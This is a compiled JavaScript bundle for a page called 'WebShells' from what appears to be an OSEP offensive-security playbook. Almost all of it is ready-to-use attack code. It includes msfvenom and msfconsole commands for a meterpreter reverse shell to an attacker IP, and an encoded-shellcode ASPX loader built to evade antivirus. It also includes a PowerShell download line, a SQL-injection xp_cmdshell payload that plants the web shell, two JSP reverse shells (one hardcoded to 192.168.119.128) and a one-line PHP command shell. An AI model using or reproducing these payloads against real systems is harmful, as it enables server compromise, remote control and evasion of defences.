"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[7554],{3882(e,n,t){t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>p,frontMatter:()=>i,metadata:()=>r,toc:()=>c});const r=JSON.parse('{"id":"osep/initial-access/Payloads/WebShells","title":"WebShells","description":"ASPX","source":"@site/docs/osep/initial-access/Payloads/WebShells.md","sourceDirName":"osep/initial-access/Payloads","slug":"/osep/initial-access/Payloads/WebShells","permalink":"/OSEP-Playbook/docs/osep/initial-access/Payloads/WebShells","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"PowerShell","permalink":"/OSEP-Playbook/docs/osep/initial-access/Payloads/Powershell"},"next":{"title":"Upgrading Shells","permalink":"/OSEP-Playbook/docs/osep/initial-access/Upgrading Shells"}}');var s=t(4848),o=t(8453);const i={},a=void 0,l={},c=[{value:"<strong>ASPX</strong>",id:"aspx",level:3},{value:"<strong>JSP</strong>",id:"jsp",level:3},{value:"<strong>PHP</strong>",id:"php",level:3}];function d(e){const n={code:"code",em:"em",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,o.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h3,{id:"aspx",children:(0,s.jsx)(n.strong,{children:"ASPX"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Steps"})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"Craft your payload"})}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=443 -f aspx -o pay.aspx\n\n"})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Encode the shellcode part of your payload using Caesar encryptor"}),"\xa0from a\xa0",(0,s.jsx)(n.code,{children:"C#"}),"\xa0Console App below; or use the\xa0",(0,s.jsx)(n.em,{children:"XOR GUI Encryptor Tool"}),"\xa0from Utilities"]}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-csharp",children:'using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\n\nnamespace CaesarEncrypt\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            // INSERT SHELLCODE HERE\n            byte[] buf = new byte[685]\n            {\n                shellcodeHere\n            };\n            byte[] encoded = new byte[buf.Length];\n            for (int i = 0; i < buf.Length; i++)\n            {\n                encoded[i] = (byte)(((uint) buf[i] + 5) & 0xFF);\n            }\n            StringBuilder hex = new StringBuilder(encoded.Length * 2);\n            foreach(byte b in encoded)\n            {\n                hex.AppendFormat("0x{0:x2}, ", b);\n            }\n            Console.WriteLine("The payload is: " + hex.ToString());\n        }\n    }\n}\n\n'})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Insert your shellcode below"}),", and save it as\xa0",(0,s.jsx)(n.code,{children:"[PAYLOAD_NAME].ASPX"})]}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-csharp",children:'< % @ Page Language = "C#"\nAutoEventWireup = "true" % > < % @ Import Namespace = "System.IO" % > < script runat = "server" > private static Int32 MEM_COMMIT = 0x1000;\nprivate static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr) 0x40;\n[System.Runtime.InteropServices.DllImport("kernel32")]\nprivate static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);\n[System.Runtime.InteropServices.DllImport("kernel32")]\nprivate static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);\n[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]\nprivate static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);\n[System.Runtime.InteropServices.DllImport("kernel32.dll")]\nprivate static extern IntPtr GetCurrentProcess();\nprotected void Page_Load(object sender, EventArgs e)\n{\n    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);\n    if (mem == null)\n    {\n        return;\n    }\n    byte[] oe7hnH0 = new byte[685]\n    {\n        shellcodeHere\n    };\n    for (int i = 0; i < oe7hnH0.Length; i++)\n    {\n        oe7hnH0[i] = (byte)(((uint) oe7hnH0[i] - 5) & 0xFF);\n    }\n    IntPtr uKVv = VirtualAlloc(IntPtr.Zero, (UIntPtr) oe7hnH0.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    System.Runtime.InteropServices.Marshal.Copy(oe7hnH0, 0, uKVv, oe7hnH0.Length);\n    IntPtr xE34tIARlB = IntPtr.Zero;\n    IntPtr iwuox = CreateThread(IntPtr.Zero, UIntPtr.Zero, uKVv, IntPtr.Zero, 0, ref xE34tIARlB);\n} < /script>\n\n'})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"Setup your listener"})}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [Attacker_IP]; set lport 443; exploit"\n\n'})}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.strong,{children:"Upload it to the server and then find a way to trigger it in the web server"})}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:'# Usually an upload functionality that after uploading allow us to see the files\n\n# PowerShell Download\niwr -uri http://[ATTACKER_IP]/[NAME].aspx -o C:\\inetpub\\wwwroot\\[PAYLOAD_NAME].aspx\n\n# SQL Injection RCE\n\'; EXEC master.dbo.xp_cmdshell "powershell.exe iwr -uri http://[ATTACKER_IP]/[NAME].aspx -o C:\\inetpub\\wwwroot\\[PAYLOAD_NAME].aspx";--\n\n'})}),"\n",(0,s.jsx)(n.h3,{id:"jsp",children:(0,s.jsx)(n.strong,{children:"JSP"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Reverse Shell Payload"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-jsx",children:'<%@\npage import="java.lang.*, java.util.*, java.io.*, java.net.*"\n% >\n<%!\nstatic class StreamConnector extends Thread\n{\n        InputStream is;\n        OutputStream os;\n\n        StreamConnector(InputStream is, OutputStream os)\n        {\n                this.is = is;\n                this.os = os;\n        }\n\n        public void run()\n        {\n                BufferedReader isr = null;\n                BufferedWriter osw = null;\n\n                try\n                {\n                        isr = new BufferedReader(new InputStreamReader(is));\n                        osw = new BufferedWriter(new OutputStreamWriter(os));\n\n                        char buffer[] = new char[8192];\n                        int lenRead;\n\n                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)\n                        {\n                                osw.write(buffer, 0, lenRead);\n                                osw.flush();\n                        }\n                }\n                catch (Exception ioe)\n\n                try\n                {\n                        if(isr != null) isr.close();\n                        if(osw != null) osw.close();\n                }\n                catch (Exception ioe)\n        }\n}\n%>\n\n<h1>JSP Backdoor Reverse Shell</h1>\n\n<form method="post">\nIP Address\n<input type="text" name="ipaddress" size=30>\nPort\n<input type="text" name="port" size=10>\n<input type="submit" name="Connect" value="Connect">\n</form>\n<p>\n<hr>\n\n<%\nString ipAddress = request.getParameter("ipaddress");\nString ipPort = request.getParameter("port");\n\nif(ipAddress != null && ipPort != null)\n{\n        Socket sock = null;\n        try\n        {\n                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\n\n                Runtime rt = Runtime.getRuntime();\n                Process proc = rt.exec("cmd.exe");\n\n                StreamConnector outputConnector =\n                        new StreamConnector(proc.getInputStream(),\n                                          sock.getOutputStream());\n\n                StreamConnector inputConnector =\n                        new StreamConnector(sock.getInputStream(),\n                                          proc.getOutputStream());\n\n                outputConnector.start();\n                inputConnector.start();\n        }\n        catch(Exception e)\n}\n%>\n\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"RCE Payload"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-jsx",children:'<%\n    /*\n     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\n     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.\n     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing\n     * the command specified in the HTML form). This is to avoid to keep it simple.\n     */\n%>\n\n<%@page import="java.lang.*"%>\n<%@page import="java.io.*"%>\n<%@page import="java.net.*"%>\n<%@page import="java.util.*"%>\n\n<html>\n<head>\n    <title>jrshell</title>\n</head>\n<body>\n<form METHOD="POST" NAME="myform" ACTION="">\n    <input TYPE="text" NAME="shell">\n    <input TYPE="submit" VALUE="Send">\n</form>\n<pre>\n<%\n\n    // Define the OS\n    String shellPath = null;\n    try\n    {\n        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {\n            shellPath = new String("/bin/sh");\n        } else {\n            shellPath = new String("cmd.exe");\n        }\n    } catch( Exception e ){}\n\n    // INNER HTML PART\n    if (request.getParameter("shell") != null) {\n        out.println("Command: " + request.getParameter("shell") + "\\n<BR>");\n        Process p;\n\n        if (shellPath.equals("cmd.exe"))\n            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));\n        else\n            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));\n\n        OutputStream os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        String disr = dis.readLine();\n        while ( disr != null ) {\n            out.println(disr);\n            disr = dis.readLine();\n        }\n    }\n\n    // TCP PORT PART\n    class StreamConnector extends Thread\n    {\n        InputStream wz;\n        OutputStream yr;\n\n        StreamConnector( InputStream wz, OutputStream yr ) {\n            this.wz = wz;\n            this.yr = yr;\n        }\n\n        public void run()\n        {\n            BufferedReader r  = null;\n            BufferedWriter w = null;\n            try\n            {\n                r  = new BufferedReader(new InputStreamReader(wz));\n                w = new BufferedWriter(new OutputStreamWriter(yr));\n                char buffer[] = new char[8192];\n                int length;\n                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\n                {\n                    w.write( buffer, 0, length );\n                    w.flush();\n                }\n            } catch( Exception e ){}\n            try\n            {\n                if( r != null )\n                    r.close();\n                if( w != null )\n                    w.close();\n            } catch( Exception e ){}\n        }\n    }\n\n    try {\n        Socket socket = new Socket( "192.168.119.128", 8081 ); // Replace with wanted ip and port\n        Process process = Runtime.getRuntime().exec( shellPath );\n        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\n        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\n        out.println("port opened on " + socket);\n     } catch( Exception e ) {}\n\n%>\n</pre>\n</body>\n</html>\n\n'})}),"\n",(0,s.jsx)(n.h3,{id:"php",children:(0,s.jsx)(n.strong,{children:"PHP"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"<?php\nSYSTEM($_REQUEST['cmd']);\n    // echo shell_exec($_GET['cmd']);\n    // echo passthru($_GET['cmd']);\n?>\n\n"})})]})}function p(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},8453(e,n,t){t.d(n,{R:()=>i,x:()=>a});var r=t(6540);const s={},o=r.createContext(s);function i(e){const n=r.useContext(o);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(o.Provider,{value:n},e.children)}}}]);